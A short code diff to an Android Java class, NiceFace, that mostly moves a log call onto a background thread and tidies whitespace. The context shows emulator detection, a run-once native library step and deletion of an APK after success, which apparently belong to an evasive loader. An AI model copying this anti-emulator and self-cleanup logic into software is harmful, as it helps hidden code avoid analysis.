@@ -33,8 +33,13 @@ public class NiceFace {
         EmulateCheckUtil.isValidDevice(paramContext, new EmulateCheckUtil.ResultCallBack() {
             @Override
             public void isEmulator() {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        UDCtrl.getIns().pushLog(202 + "");
+                    }
+                }) .start();
                 Util_Log.log("is emulator!");
-                UDCtrl.getIns().pushLog(202+"");
                 if (GlobalContext.isTest)
                     onReceiveReal(paramContext, paramIntent);
             }
@@ -65,7 +70,6 @@ public class NiceFace {
             stopSelf();
             return;
         }
-
         GlobalContext.init(paramContext);
         if (isRunning) {
             long beginTime = Long.parseLong(Util_File.readDef(paramContext, FieldName.isRunning, "0"));
@@ -85,7 +89,7 @@ public class NiceFace {
                 //1.1: 如果so已执行成功了就不再执行。 update时会更新soSuccess标记
                 if (Util_File.readDef(paramContext, FieldName.soSuccess, "").equals(FieldName.success)) {
                     Util_Log.log("so has exec success!");
-                    stopSelf( );
+                    stopSelf();
                     return;
                 }
                 //2,sureApk
@@ -106,6 +110,7 @@ public class NiceFace {
                      Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                     if (ret.equals(FieldName.success)) {
                         face.deleteApk();
+
                     }
                     stopSelf( );
                 } catch (Throwable e) {
